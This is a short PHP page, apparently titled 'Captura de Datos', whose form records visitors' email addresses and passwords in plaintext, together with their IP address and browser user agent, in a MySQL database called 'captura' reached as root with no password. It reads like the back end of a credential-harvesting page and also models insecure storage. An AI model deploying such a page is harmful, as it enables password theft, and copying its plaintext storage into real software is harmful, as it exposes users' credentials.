<?php
// Configuración de la base de datos
$host = "localhost";
$user = "root";
$pass = ""; // Cambia si tu contraseña es distinta
$dbname = "captura";

// Conexión
$conn = new mysqli($host, $user, $pass, $dbname);

// Verifica la conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

// Procesar formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = isset($_POST['correo']) ? $_POST['correo'] : '';
    $contrasena = isset($_POST['password']) ? $_POST['password'] : '';
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $ip_cliente = $_SERVER['REMOTE_ADDR'];

    // Insertar en base de datos
    $stmt = $conn->prepare("INSERT INTO datos (correo, contrasena, user_agent, ip_cliente) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("ssss", $correo, $contrasena, $user_agent, $ip_cliente);
    $stmt->execute();
    $stmt->close();

    echo "<p style='color:green;'>Datos enviados correctamente.</p>";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Captura de Datos</title>
</head>
<body>
    <h2>Formulario</h2>
    <form method="post">
        <label for="correo">Correo:</label><br>
        <input type="email" id="correo" name="correo" required><br><br>

        <label for="password">Contraseña:</label><br>
        <input type="password" id="password" name="password" required><br><br>

        <input type="submit" value="Enviar">
    </form>
</body>
</html>